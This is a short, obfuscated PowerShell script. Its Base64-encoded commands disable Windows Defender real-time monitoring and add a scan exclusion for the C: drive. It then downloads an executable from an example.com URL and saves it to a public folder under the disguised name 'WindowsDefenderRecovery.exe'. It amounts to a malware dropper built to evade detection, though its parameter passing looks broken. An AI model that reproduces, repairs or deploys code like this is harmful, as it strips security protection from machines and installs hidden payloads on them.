$b = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLmV4ZQ=="))
$o = "C:\Users\Public\Public Account Pictures\WindowsDefenderRecovery.exe"
$p = "C:\"
([ScriptBlock]::Create(("U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ==" | % {[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))}))).Invoke()
([ScriptBlock]::Create(("QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcg==" | % {[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))}))).Invoke() -r $p
([ScriptBlock]::Create(("SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkaSAgLU91dEZpbGUgJG8=" | % {[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))}))).Invoke() -i $b